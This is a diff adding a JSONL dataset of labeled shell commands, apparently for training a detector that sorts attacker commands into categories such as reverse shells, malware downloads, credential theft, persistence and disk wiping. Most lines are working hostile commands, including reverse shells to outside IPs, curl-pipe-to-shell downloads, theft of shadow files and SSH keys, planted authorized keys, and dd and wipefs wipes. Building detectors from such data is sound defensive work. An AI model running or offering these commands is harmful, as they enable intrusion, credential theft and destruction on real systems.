@@ -1,0 +1,1591 @@
+{"text": "chattr +i /tmp/clean.sh &", "label": "defense_evasion", "template": "defense_evasion:36"}
+{"text": "cd /home/ubuntu; >/mnt/.WNDXT && cd /tmp/", "label": "reconnaissance", "template": "reconnaissance:31"}
+{"text": "cd /dev/shm && cat /etc/shadow | head -n 3 2>/dev/null", "label": "credential_access", "template": "credential_access:40"}
+{"text": "cp /etc/shadow /mnt/s.txt", "label": "credential_access", "template": "credential_access:3"}
+{"text": "cd /var/tmp && systemctl stop rsyslog 2>/dev/null", "label": "defense_evasion", "template": "defense_evasion:31"}
+{"text": "chmod 777 x; ./networkservice >/dev/null", "label": "malware_execution", "template": "malware_execution:12"}
+{"text": "cd ..", "label": "benign", "template": "benign:41"}
+{"text": "cat > /etc/systemd/system/mpsl.service << EOF", "label": "persistence", "template": "persistence:33"}
+{"text": "bash /tmp/spc.sh & 2>/dev/null", "label": "malware_execution", "template": "malware_execution:28"}
+{"text": "cd /dev/shm && echo 'sh /usr/bin/k' >> ~/.bashrc", "label": "persistence", "template": "persistence:20"}
+{"text": "echo DONE &", "label": "reconnaissance", "template": "reconnaissance:4"}
+{"text": "tftp; wget; /bin/busybox CFGARDD", "label": "reconnaissance", "template": "reconnaissance:45"}
+{"text": "cd /tmp; cd /var/run; cd /etc; head /etc/shadow", "label": "credential_access", "template": "credential_access:2"}
+{"text": "cd /tmp; cd /var/run; cd /home/ubuntu; id -u", "label": "reconnaissance", "template": "reconnaissance:131"}
+{"text": "chmod 777 arm5; ./bot >/dev/null", "label": "malware_execution", "template": "malware_execution:12"}
+{"text": "Content-Length: 8", "label": "benign", "template": "benign:7"}
+{"text": "tar czf /var/run/b.tgz /root/.aws /root/.ssh", "label": "credential_access", "template": "credential_access:32"}
+{"text": "nohup ./k &", "label": "malware_execution", "template": "malware_execution:21"}
+{"text": "ip route", "label": "reconnaissance", "template": "reconnaissance:91"}
+{"text": "cd /tmp; :(){ :|:& };:", "label": "destructive", "template": "destructive:16"}
+{"text": "sh -i >& /dev/udp/45.92.141.241/443 0>&1", "label": "reverse_shell", "template": "reverse_shell:3"}
+{"text": "cd /tmp && cat /var/www/html/wp-config.php > /dev/null 2>&1", "label": "credential_access", "template": "credential_access:20"}
+{"text": "ftpget 178.245.8.197 f ftpget", "label": "malware_downloader", "template": "malware_downloader:16"}
+{"text": "ip route 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:91"}
+{"text": "cd /etc && rm -rf .KWBU", "label": "reconnaissance", "template": "reconnaissance:9"}
+{"text": "cd /mnt; chmod 755 /var/run/m68k >/dev/null", "label": "malware_execution", "template": "malware_execution:10"}
+{"text": "echo test", "label": "benign", "template": "benign:47"}
+{"text": "echo -e '\\x99\\x88\\x28\\x89\\x1d\\x1a\\x52\\xa3\\x7c\\xda\\x69\\x83\\xbc\\x43\\xbb\\x78\\xef\\x6b\\x4d\\x7c\\xec\\xc6\\x1a\\x58\\x69\\xdc\\x57\\xd3\\x7a\\x9a\\x30\\xe8' >> clean.sh", "label": "malware_downloader", "template": "malware_downloader:10"}
+{"text": "ls -l /etc", "label": "benign", "template": "benign:36"}
+{"text": "cd /var/tmp; ss -tulpn", "label": "reconnaissance", "template": "reconnaissance:86"}
+{"text": "rm -rf /bin /sbin /lib", "label": "destructive", "template": "destructive:8"}
+{"text": "echo -e '\\x6b\\x61\\x6d\\x69/var/run' > /mnt/.nippon; cat /usr/bin/.nippon; rm /mnt/.nippon", "label": "reconnaissance", "template": "reconnaissance:7"}
+{"text": "wipefs -a /dev/sda", "label": "destructive", "template": "destructive:18"}
+{"text": "./ssh-scanner", "label": "network_scan", "template": "network_scan:10"}
+{"text": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"5.199.18.53\",31337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "label": "reverse_shell", "template": "reverse_shell:14"}
+{"text": "openssl s_client -quiet -connect 185.17.127.94:6666 | /bin/sh | openssl s_client -quiet -connect 45.4.23.237:9999", "label": "reverse_shell", "template": "reverse_shell:22"}
+{"text": "ls -lah /home", "label": "benign", "template": "benign:37"}
+{"text": "/usr/bin/xmrig -o xmr.pool.example-pool.net:3333 -u 4ND4Ji26bGCmnJhzo2VoVB2oTxiTJAXpjRYnRKboMvsxY4dLDBrYfvVohEEPXKHQhBexFqguCRYBnjhpfDYLLnNKKG1yPJc -p x --background", "label": "cryptominer", "template": "cryptominer:3"}
+{"text": "./kinsing 2>/dev/null", "label": "cryptominer", "template": "cryptominer:12"}
+{"text": "rm -rf networkservice; wget http://node-pkg.club/dl/dota3.tar.gz; chmod +x spc; ./a.sh", "label": "malware_downloader", "template": "malware_downloader:36"}
+{"text": "exec 5<>/dev/tcp/23.156.61.16/1337; cat <&5 | while read line; do $line 2>&5 >&5; done", "label": "reverse_shell", "template": "reverse_shell:5"}
+{"text": "curl -sL http://141.37.229.170/tmp/x86_64 | python", "label": "malware_downloader", "template": "malware_downloader:49"}
+{"text": "cd /dev/shm; chattr +i /home/ubuntu/gafgyt", "label": "defense_evasion", "template": "defense_evasion:36"}
+{"text": "ls", "label": "benign", "template": "benign:34"}
+{"text": "Via: SIP/2.0/UDP 23.218.167.170:5060;branch=z9hG4bKlis", "label": "benign", "template": "benign:9"}
+{"text": "python gafgyt.py &", "label": "malware_execution", "template": "malware_execution:31"}
+{"text": "export PATH=$PATH:/tmp && unset HISTFILE", "label": "defense_evasion", "template": "defense_evasion:39"}
+{"text": "cd /mnt; > /dev/sda", "label": "destructive", "template": "destructive:19"}
+{"text": "mkdir test", "label": "benign", "template": "benign:54"}
+{"text": "find / -perm -u=s -type f 2>/dev/null", "label": "privilege_escalation", "template": "privilege_escalation:11"}
+{"text": "cd /var/tmp && which python3 > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:99"}
+{"text": "unshadow /etc/passwd /etc/shadow > h.txt", "label": "credential_access", "template": "credential_access:4"}
+{"text": "wget ftp://23.115.40.135/systemd-helper", "label": "malware_downloader", "template": "malware_downloader:48"}
+{"text": "cd /var/run; ps -ef | grep -v grep | grep ssh", "label": "reconnaissance", "template": "reconnaissance:81"}
+{"text": "cd /tmp; cd /var/run; cd /var/run; cat secrets.json", "label": "credential_access", "template": "credential_access:24"}
+{"text": "cd /tmp; cd /var/run; cd /etc; scp -r /mnt/data ftp@193.237.124.46:/tmp", "label": "network_scan", "template": "network_scan:19"}
+{"text": "cp /etc/shadow /var/run/s.txt &", "label": "credential_access", "template": "credential_access:3"}
+{"text": "chown -R nobody /", "label": "destructive", "template": "destructive:22"}
+{"text": "cd /proc/; cat self/cmdline", "label": "reconnaissance", "template": "reconnaissance:39"}
+{"text": "top > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:16"}
+{"text": "cd /var/run", "label": "benign", "template": "benign:40"}
+{"text": "wget http://dl-mirror.info/bins/systemd-helper >/dev/null", "label": "malware_downloader", "template": "malware_downloader:19"}
+{"text": "rm -f .SPZKD", "label": "reconnaissance", "template": "reconnaissance:10"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; echo 'git ALL=(ALL:ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers", "label": "privilege_escalation", "template": "privilege_escalation:30"}
+{"text": "cd /tmp; cd /var/run; cd /var/run; ping; sh >/dev/null", "label": "reconnaissance", "template": "reconnaissance:23"}
+{"text": "cat /var/www/.env", "label": "credential_access", "template": "credential_access:22"}
+{"text": "cd /tmp && pkill -9 auditd &", "label": "defense_evasion", "template": "defense_evasion:29"}
+{"text": "sh ./run.sh >/dev/null 2>&1 > /dev/null 2>&1", "label": "malware_execution", "template": "malware_execution:30"}
+{"text": "find / -name \"*.pem\" 2>/dev/null", "label": "credential_access", "template": "credential_access:9"}
+{"text": "sshpass -p root ssh user@23.178.146.153", "label": "network_scan", "template": "network_scan:32"}
+{"text": "ls -la /root", "label": "reconnaissance", "template": "reconnaissance:103"}
+{"text": "/bin/bash -i >& /dev/tcp/185.65.184.114/443 0>&1", "label": "reverse_shell", "template": "reverse_shell:1"}
+{"text": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0B3RcI2hYpbiKwyBMnDbLCzv+jIeX3tBZy70/OY/42e4cJF+kEeVzUIh7LGGUyU8olGlEUIC78vjMJcBvxJ+CgglnI1APaO/MSbsrcf3JVtrzMxAitiIiZRxMiiPAOflrAsM4== ftp@host\" >> .ssh/authorized_keys && chmod -R go= ~/.ssh", "label": "persistence", "template": "persistence:9"}
+{"text": "./LinEnum.sh >/dev/null", "label": "privilege_escalation", "template": "privilege_escalation:19"}
+{"text": "cd /mnt; capsh --print", "label": "privilege_escalation", "template": "privilege_escalation:35"}
+{"text": "cd /tmp; cd /var/run; cd /usr/bin; rm .UDCDTGPY 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:11"}
+{"text": "cat /proc/meminfo | grep MemTotal", "label": "reconnaissance", "template": "reconnaissance:66"}
+{"text": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'", "label": "reconnaissance", "template": "reconnaissance:67"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; ./exploit", "label": "privilege_escalation", "template": "privilege_escalation:23"}
+{"text": "ulimit -n 999999; unset HISTFILE 2>/dev/null", "label": "defense_evasion", "template": "defense_evasion:40"}
+{"text": "adduser support", "label": "persistence", "template": "persistence:25"}
+{"text": "exec 5<>/dev/tcp/23.144.183.149/9001; cat <&5 | while read line; do $line 2>&5 >&5; done", "label": "reverse_shell", "template": "reverse_shell:5"}
+{"text": "echo '*/10 * * * * /var/tmp/k' >> /etc/crontab", "label": "persistence", "template": "persistence:15"}
+{"text": "sudo -i", "label": "privilege_escalation", "template": "privilege_escalation:0"}
+{"text": "chown -R nobody / > /dev/null 2>&1", "label": "destructive", "template": "destructive:22"}
+{"text": "From: <sip:vutiwgg@pmt>;tag=rifhw", "label": "benign", "template": "benign:4"}
+{"text": "su - pi > /dev/null 2>&1", "label": "privilege_escalation", "template": "privilege_escalation:32"}
+{"text": "busybox wget http://62.48.40.222/x/init.sh", "label": "malware_downloader", "template": "malware_downloader:39"}
+{"text": "/bin/busybox ftpget 103.48.85.67 ld.sh sh4 && sh bins.sh", "label": "malware_downloader", "template": "malware_downloader:17"}
+{"text": "cd /etc && uname -a; curl -s -L http://mirror.pkg.cn/payload.sh -o /tmp/arm7; perl /home/ubuntu/xmr.sh", "label": "malware_downloader", "template": "malware_downloader:18"}
+{"text": "nc -e /bin/sh 192.155.63.229 6666", "label": "reverse_shell", "template": "reverse_shell:6"}
+{"text": "nc -z 5.9.234.76 22", "label": "network_scan", "template": "network_scan:21"}
+{"text": "cat /proc/version", "label": "reconnaissance", "template": "reconnaissance:78"}
+{"text": "cd /var/www", "label": "benign", "template": "benign:72"}
+{"text": "cd /tmp; cd /var/run; cd /usr/bin; lsb_release -a", "label": "reconnaissance", "template": "reconnaissance:95"}
+{"text": "/mnt/payload.sh", "label": "malware_execution", "template": "malware_execution:18"}
+{"text": "uname -s -v -n -r -m &", "label": "reconnaissance", "template": "reconnaissance:43"}
+{"text": "./xmrig --donate-level 1 -o stratum+tcp://gulf.moneroocean.stream:10128 -u 4b3qVr42fMbur8wnS2X6106LD1A1r8TQobWNPivMqKEDaBdSpnHuLDFhi4aA6d6o7Z9gTPTMxeYzj63RvTtuhX9TR0zX692 > /dev/null 2>&1", "label": "cryptominer", "template": "cryptominer:1"}
+{"text": "nohup /dev/shm/clean.sh > /dev/null 2>&1 &", "label": "malware_execution", "template": "malware_execution:22"}
+{"text": "python -c 'import os; os.system(\"/var/tmp/ppc\")'", "label": "malware_execution", "template": "malware_execution:44"}
+{"text": "ncat --exec /bin/bash 23.28.103.110 443", "label": "reverse_shell", "template": "reverse_shell:10"}
+{"text": "cat secrets.yml", "label": "credential_access", "template": "credential_access:23"}
+{"text": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 89.32.24.110 9001 > /tmp/f", "label": "reverse_shell", "template": "reverse_shell:12"}
+{"text": "/bin/busybox hostname FUFDJQ > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:35"}
+{"text": "echo \"test:Passw0rd123\" | chpasswd &", "label": "persistence", "template": "persistence:26"}
+{"text": "0<&196;exec 196<>/dev/tcp/203.204.254.159/4444; sh <&196 >&196 2>&196", "label": "reverse_shell", "template": "reverse_shell:4"}
+{"text": "nohup ./minerd -o stratum+tcp://xmr-eu1.nanopool.org:14444 &", "label": "cryptominer", "template": "cryptominer:5"}
+{"text": "echo 'rm -f .c $a' >> .s", "label": "malware_downloader", "template": "malware_downloader:2"}
+{"text": "&k`g&k|zpkfq)ES[M", "label": "benign", "template": "benign:18"}
+{"text": "/bin/busybox ps; /bin/busybox TELIZG", "label": "reconnaissance", "template": "reconnaissance:26"}
+{"text": "sudo /bin/sh", "label": "privilege_escalation", "template": "privilege_escalation:6"}
+{"text": "cd /var/run && /clean.sh >/dev/null", "label": "reconnaissance", "template": "reconnaissance:123"}
+{"text": "cd /tmp && ls", "label": "benign", "template": "benign:63"}
+{"text": "ncat 45.99.28.59 4444 -e /bin/bash", "label": "reverse_shell", "template": "reverse_shell:9"}
+{"text": "1+1", "label": "benign", "template": "benign:28"}
+{"text": "w -h >/dev/null", "label": "reconnaissance", "template": "reconnaissance:130"}
+{"text": "tftp; wget; /bin/busybox PKCVQXI", "label": "reconnaissance", "template": "reconnaissance:45"}
+{"text": "yes", "label": "benign", "template": "benign:20"}
+{"text": "sudo su", "label": "privilege_escalation", "template": "privilege_escalation:1"}
+{"text": "cd /tmp; cd /var/run; cd /root; chmod 777 mips; ./payload.sh", "label": "malware_execution", "template": "malware_execution:12"}
+{"text": "socat tcp-connect:193.23.161.26:31337 exec:/bin/sh", "label": "reverse_shell", "template": "reverse_shell:20"}
+{"text": "find / -perm -4000 2>/dev/null &", "label": "privilege_escalation", "template": "privilege_escalation:10"}
+{"text": "sshpass -p oracle ssh admin@203.193.254.116", "label": "network_scan", "template": "network_scan:32"}
+{"text": "cd /var/run && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEApu+HnXQKnzlrMTjSfr/df1lsJ8l/nyGuiRH4Mz19ULP1K+zcyL6sfBSGxfc3u5+RYNLY/+dMgUlwgw8N4bLtlu+Syfz6QmNgyMLqCEY49sZoBlLflgcg6xKX== mdrfckr' >> ~/.ssh/authorized_keys 2>/dev/null", "label": "persistence", "template": "persistence:3"}
+{"text": "cat passwords.txt >/dev/null", "label": "credential_access", "template": "credential_access:25"}
+{"text": "cd /root; echo 'XALRPQTB'", "label": "reconnaissance", "template": "reconnaissance:6"}
+{"text": "python -c 'import os; os.system(\"/tmp/sh4\")'", "label": "malware_execution", "template": "malware_execution:44"}
+{"text": "echo '/mnt/ppc &' >> /etc/rc.local > /dev/null 2>&1", "label": "persistence", "template": "persistence:19"}
+{"text": "Host: 192.243.15.233", "label": "benign", "template": "benign:31"}
+{"text": "cd /var/tmp; hostname -I > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:57"}
+{"text": "cd /tmp; cd /var/run; cd /root; su root", "label": "privilege_escalation", "template": "privilege_escalation:4"}
+{"text": "chmod -R 000 /", "label": "destructive", "template": "destructive:21"}
+{"text": "date", "label": "benign", "template": "benign:66"}
+{"text": "nc 5.24.46.38 5555 -e /bin/sh", "label": "reverse_shell", "template": "reverse_shell:8"}
+{"text": "echo > /var/log/auth.log", "label": "defense_evasion", "template": "defense_evasion:15"}
+{"text": "bash -c 'bash -i >& /dev/tcp/62.52.215.218/9001 0>&1'", "label": "reverse_shell", "template": "reverse_shell:2"}
+{"text": "ss -tulpn", "label": "reconnaissance", "template": "reconnaissance:86"}
+{"text": "cd /tmp && /bin/busybox ECCHI", "label": "reconnaissance", "template": "reconnaissance:110"}
+{"text": "0<&196;exec 196<>/dev/tcp/193.114.229.197/4444; sh <&196 >&196 2>&196", "label": "reverse_shell", "template": "reverse_shell:4"}
+{"text": "cd /root && ls", "label": "benign", "template": "benign:63"}
+{"text": "cd /tmp; cd /var/run; cd /root; sudo -n true &", "label": "privilege_escalation", "template": "privilege_escalation:9"}
+{"text": "cd /proc; ls &", "label": "reconnaissance", "template": "reconnaissance:41"}
+{"text": "cd /dev/shm; cat /etc/passwd /etc/shadow", "label": "credential_access", "template": "credential_access:1"}
+{"text": "cd /tmp; cd /var/run; cd /etc; find / -perm -u=s -type f 2>/dev/null 2>/dev/null", "label": "privilege_escalation", "template": "privilege_escalation:11"}
+{"text": "cd /home/ubuntu && sh linpeas.sh", "label": "privilege_escalation", "template": "privilege_escalation:18"}
+{"text": "fetch http://192.101.246.26/bins/kworkerds", "label": "malware_downloader", "template": "malware_downloader:47"}
+{"text": "su - git", "label": "privilege_escalation", "template": "privilege_escalation:32"}
+{"text": "cd /tmp; cd /var/run; cd /mnt; cat /root/.bash_history", "label": "credential_access", "template": "credential_access:28"}
+{"text": "cd /etc; cd /var/run; wget http://bin-pkg.xyz/x86_64; chmod +x k; ./kworkerds >/dev/null", "label": "malware_downloader", "template": "malware_downloader:32"}
+{"text": "masscan 5.161.148.115/16 -p80,443", "label": "network_scan", "template": "network_scan:5"}
+{"text": "cd /tmp; uname -s -v -n -r -m >/dev/null", "label": "reconnaissance", "template": "reconnaissance:52"}
+{"text": "start", "label": "benign", "template": "benign:17"}
+{"text": "ftpget -v -u anonymous -p anonymous 103.37.116.110 k bot >/dev/null", "label": "malware_downloader", "template": "malware_downloader:44"}
+{"text": "cd /root; curl -k https://update.dl.xyz/mips | bash", "label": "malware_downloader", "template": "malware_downloader:55"}
+{"text": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"178.6.202.235\",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'", "label": "reverse_shell", "template": "reverse_shell:15"}
+{"text": "./linpeas.sh", "label": "privilege_escalation", "template": "privilege_escalation:17"}
+{"text": "echo 'root:clean.sh123' | chpasswd", "label": "persistence", "template": "persistence:27"}
+{"text": "szhrb7", "label": "benign", "template": "benign:2"}
+{"text": "arch", "label": "reconnaissance", "template": "reconnaissance:107"}
+{"text": "LD_PRELOAD=/dev/shm/bot.so ./networkservice", "label": "malware_execution", "template": "malware_execution:45"}
+{"text": "nmap -p 22 62.196.214.170", "label": "network_scan", "template": "network_scan:1"}
+{"text": ">/var/run/.f && /bin/busybox chmod 777 /etc/.f && /mnt/.f && cd /usr/bin/; ", "label": "reconnaissance", "template": "reconnaissance:1"}
+{"text": "curl -sL http://node-pkg.top/files/mips | python", "label": "malware_downloader", "template": "malware_downloader:49"}
+{"text": "export HISTFILESIZE=0", "label": "defense_evasion", "template": "defense_evasion:10"}
+{"text": "HISTFILE=/dev/null > /dev/null 2>&1", "label": "defense_evasion", "template": "defense_evasion:12"}
+{"text": "echo -e '\\x6b\\x61\\x6d\\x69/dev/shm' > /mnt/.nippon; cat /etc/.nippon; rm /home/ubuntu/.nippon &", "label": "reconnaissance", "template": "reconnaissance:7"}
+{"text": "cat /home/test/.bash_history", "label": "credential_access", "template": "credential_access:27"}
+{"text": "echo -ne \"\\xc7\\xef\\xf3\\x36\\x03\\x4f\\xe8\\xcc\\x14\\x7d\\x80\\xad\\x9a\\xf5\\xe3\\xe1\\x4a\\x9c\\x2f\\x43\\xec\\xe2\\xc8\\x5d\\xbb\\x9a\\x46\\x20\\x19\\x41\\x10\\xc0\\xc4\\x79\\x94\\x2f\\xd9\\xf5\\xf4\\x97\\xa9\\xb8\\x15\\x2d\\x98\\xb4\\xec\\x3e\" >> kworkerds", "label": "malware_downloader", "template": "malware_downloader:8"}
+{"text": "php -r '$sock=fsockopen(\"77.179.212.145\",5555);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "label": "reverse_shell", "template": "reverse_shell:17"}
+{"text": "cd /mnt && ./monero-miner --pool pool.minexmr.com:4444", "label": "cryptominer", "template": "cryptominer:27"}
+{"text": "setsid ./x", "label": "malware_execution", "template": "malware_execution:23"}
+{"text": "echo 'rm -f .c $a' >> .s > /dev/null 2>&1", "label": "malware_downloader", "template": "malware_downloader:2"}
+{"text": "la", "label": "benign", "template": "benign:61"}
+{"text": "ruby -rsocket -e'f=TCPSocket.open(\"185.135.186.25\",5555).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "label": "reverse_shell", "template": "reverse_shell:18"}
+{"text": "./monero-miner --pool xmr-eu1.nanopool.org:14444", "label": "cryptominer", "template": "cryptominer:27"}
+{"text": "cd /home/ubuntu && rm -rf /var/lib/mysql", "label": "destructive", "template": "destructive:6"}
+{"text": "Contact: <sip:poxxaf@gfhyhubw>", "label": "benign", "template": "benign:6"}
+{"text": "cat /sys/class/dmi/id/product_name", "label": "reconnaissance", "template": "reconnaissance:125"}
+{"text": "cd /etc; cp /etc/shadow /root/s.txt > /dev/null 2>&1", "label": "credential_access", "template": "credential_access:3"}
+{"text": "cd /tmp; cd /var/run; cd /root; head -c 0 > /usr/bin/onwiav_sign", "label": "reconnaissance", "template": "reconnaissance:14"}
+{"text": "cat /var/www/html/wp-config.php", "label": "credential_access", "template": "credential_access:20"}
+{"text": "cd /tmp; nohup ./xmrig -o xmr.pool.example-pool.net:3333 -u 4z3JJPyfppF3CyxuDLfjssWpmKcV0yrwBHTrLFdRamABC3WTYafvPNFfxBtSRmih5w5A1AQodqMQqh2Jv9C7FfHorAPngma -k --tls & &", "label": "cryptominer", "template": "cryptominer:2"}
+{"text": "curl http://5.117.95.152:4444/networkservice -o m68k", "label": "malware_downloader", "template": "malware_downloader:53"}
+{"text": "cat /proc/cpuinfo | grep name | wc -l > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:64"}
+{"text": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIbpXLVCe3dsK4Kf00BDsAvdB8kJ/XMeY2xFBwa80avr2dtgKihuxl0F8XThE3VFWJEV3SUeOIckA01nNUf9xndbYcJ1 root@kali\" >> .ssh/authorized_keys && chmod -R go= ~/.ssh", "label": "persistence", "template": "persistence:9"}
+{"text": "cd /etc; wget http://23.244.75.205/bins/a.sh -O- | sh", "label": "malware_downloader", "template": "malware_downloader:14"}
+{"text": "crontab -l", "label": "reconnaissance", "template": "reconnaissance:94"}
+{"text": "Contact: <sip:zoowzmv@ykaw>", "label": "benign", "template": "benign:6"}
+{"text": "tftp 178.69.25.74 -c get x86_64", "label": "malware_downloader", "template": "malware_downloader:43"}
+{"text": "strings /proc/*/environ | grep -i pass", "label": "credential_access", "template": "credential_access:35"}
+{"text": "ssh -o StrictHostKeyChecking=no ftp@193.35.40.241 id", "label": "network_scan", "template": "network_scan:16"}
+{"text": "Host: 178.12.150.245", "label": "benign", "template": "benign:31"}
+{"text": "echo 'sh /usr/bin/init.sh' >> ~/.bashrc", "label": "persistence", "template": "persistence:20"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; w", "label": "reconnaissance", "template": "reconnaissance:15"}
+{"text": "cd /tmp; cd /var/run; cd /home/ubuntu; su root", "label": "privilege_escalation", "template": "privilege_escalation:4"}
+{"text": "cat kworkerds.pub >> ~/.ssh/authorized_keys 2>/dev/null", "label": "persistence", "template": "persistence:10"}
+{"text": "cd /usr/bin && cat backup_credentials.txt", "label": "credential_access", "template": "credential_access:41"}
+{"text": "cd /home/ubuntu; tar czf /var/tmp/k.tgz ~/.ssh &", "label": "credential_access", "template": "credential_access:31"}
+{"text": "rm -f .NKZJVHX &", "label": "reconnaissance", "template": "reconnaissance:10"}
+{"text": "cd /var/tmp; ./masscan --ports 22 103.117.248.168/8", "label": "network_scan", "template": "network_scan:9"}
+{"text": "ip a > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:89"}
+{"text": "mkdir -p ~/.ssh > /dev/null 2>&1", "label": "persistence", "template": "persistence:5"}
+{"text": "tar xvf k.tgz; cd tsunami; ./run", "label": "malware_execution", "template": "malware_execution:40"}
+{"text": "To: <sip:odvhjbp@wglrkisd>", "label": "benign", "template": "benign:5"}
+{"text": "echo 'cd /tmp||cd /var/run||cd /mnt||cd /root||cd /' >> .s > /dev/null 2>&1", "label": "malware_downloader", "template": "malware_downloader:3"}
+{"text": "cd /home/ubuntu && wget http://77.79.99.131/cdn/tsunami && chmod 777 bins.sh && ./networkservice", "label": "malware_downloader", "template": "malware_downloader:33"}
+{"text": "cd /tmp; cd /var/run; cd /tmp; dd if=/dev/zero of=/dev/nvme0n1 >/dev/null", "label": "destructive", "template": "destructive:12"}
+{"text": "/bin/busybox tftp -g databin.ru -r tftp.sh -l- | sh", "label": "malware_downloader", "template": "malware_downloader:15"}
+{"text": "chmod 777 gafgyt", "label": "malware_execution", "template": "malware_execution:9"}
+{"text": "/bin/busybox cp /bin/busybox .WMIBHD; >.WGXU; /bin/busybox chmod 777 .QIUWZ; /bin/busybox MFBAEJH", "label": "reconnaissance", "template": "reconnaissance:48"}
+{"text": "Via: SIP/2.0/UDP 103.85.218.142:5060;branch=z9hG4bKpxgcc", "label": "benign", "template": "benign:9"}
+{"text": "wget -O spc http://update-net.ru/dl/run > /dev/null 2>&1", "label": "malware_downloader", "template": "malware_downloader:24"}
+{"text": "scp ld.sh pi@103.226.35.77:/tmp/", "label": "network_scan", "template": "network_scan:18"}
+{"text": "ls | wc -l", "label": "benign", "template": "benign:62"}
+{"text": "chmod 4755 /var/run/systemd-helper &", "label": "privilege_escalation", "template": "privilege_escalation:14"}
+{"text": "ncat 193.136.231.90 8080 -e /bin/bash", "label": "reverse_shell", "template": "reverse_shell:9"}
+{"text": "hydra -l root -P pass.txt ssh://103.243.229.192 2>/dev/null", "label": "network_scan", "template": "network_scan:11"}
+{"text": "dd if=/dev/zero of=/dev/sda1 bs=4096 >/dev/null", "label": "destructive", "template": "destructive:11"}
+{"text": "head -n 5 file.txt", "label": "benign", "template": "benign:52"}
+{"text": "(crontab -l; echo \"@reboot /mnt/mpsl\") | crontab -", "label": "persistence", "template": "persistence:14"}
+{"text": "export HISTSIZE=0 >/dev/null", "label": "defense_evasion", "template": "defense_evasion:9"}
+{"text": "lsb_release -a", "label": "reconnaissance", "template": "reconnaissance:95"}
+{"text": "./pspy64", "label": "privilege_escalation", "template": "privilege_escalation:20"}
+{"text": "cd /tmp; cd /var/run; cd /etc; ls -lh $(which ls) >/dev/null", "label": "reconnaissance", "template": "reconnaissance:100"}
+{"text": "sudo -n true", "label": "privilege_escalation", "template": "privilege_escalation:9"}
+{"text": "echo '/dev/shm/spc' >> ~/.profile", "label": "persistence", "template": "persistence:21"}
+{"text": "./cpuminer-multi -a cryptonight -o stratum+tcp://xmr.pool.example-pool.net:3333", "label": "cryptominer", "template": "cryptominer:7"}
+{"text": "wget -qO- icanhazip.com", "label": "reconnaissance", "template": "reconnaissance:117"}
+{"text": "cat .env", "label": "credential_access", "template": "credential_access:21"}
+{"text": "cd /tmp; cd /var/run; cd /etc; sh /mnt/bot.sh", "label": "malware_execution", "template": "malware_execution:27"}
+{"text": "wget http://212.29.101.182/dl/spc -O- &", "label": "malware_downloader", "template": "malware_downloader:13"}
+{"text": "cd /var/tmp; cat ~/.netrc", "label": "credential_access", "template": "credential_access:16"}
+{"text": "tar czf /var/tmp/b.tgz /root/.aws /root/.ssh", "label": "credential_access", "template": "credential_access:32"}
+{"text": "./update.sh", "label": "malware_execution", "template": "malware_execution:14"}
+{"text": "lastlog >/dev/null", "label": "reconnaissance", "template": "reconnaissance:62"}
+{"text": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:193.164.199.34:9001", "label": "reverse_shell", "template": "reverse_shell:19"}
+{"text": "./miner --algo randomx --pool pool.minexmr.com:4444 --user 4YiMGZ5vK5QPTL4PFtDou7PcTRpRFvvehwit8Jv58Lq6ErwqPuQXC2p2RCz0eeqDPUZizd933qfPC51NB3RtyL86Q0o8Lxh", "label": "cryptominer", "template": "cryptominer:23"}
+{"text": "curl http://103.211.252.35:53/systemd-helper -o update.sh", "label": "malware_downloader", "template": "malware_downloader:53"}
+{"text": "echo \"*/5 * * * * curl -s http://static.dl.xyz/gafgyt | sh\" | crontab -", "label": "persistence", "template": "persistence:13"}
+{"text": "hostname", "label": "reconnaissance", "template": "reconnaissance:56"}
+{"text": "echo cHJpbnQgImhpIg== | base64 -d | sh", "label": "malware_execution", "template": "malware_execution:36"}
+{"text": "/bin/busybox clean.sh", "label": "reconnaissance", "template": "reconnaissance:109"}
+{"text": "cat /dev/null > ~/.bash_history", "label": "defense_evasion", "template": "defense_evasion:17"}
+{"text": "masscan -p22 0.0.0.0/0 --rate 100000", "label": "network_scan", "template": "network_scan:4"}
+{"text": "curl -s http://62.243.97.221/cdn/setup.sh | sh &", "label": "malware_downloader", "template": "malware_downloader:29"}
+{"text": "nohup ./clean.sh & 2>/dev/null", "label": "malware_execution", "template": "malware_execution:21"}
+{"text": "echo 'done' >> .lcyfa", "label": "malware_downloader", "template": "malware_downloader:5"}
+{"text": "tar xzf ld.sh.tar.gz && cd xmr.sh && ./start", "label": "malware_execution", "template": "malware_execution:39"}
+{"text": "cd /tmp; cd /var/run; cd /dev/shm; ./scan 22 &", "label": "network_scan", "template": "network_scan:8"}
+{"text": "Host: 62.199.40.60", "label": "benign", "template": "benign:31"}
+{"text": "echo '/home/ubuntu/networkservice' >> ~/.profile", "label": "persistence", "template": "persistence:21"}
+{"text": "touch /dev/shm/.test && rm /dev/shm/.test", "label": "reconnaissance", "template": "reconnaissance:108"}
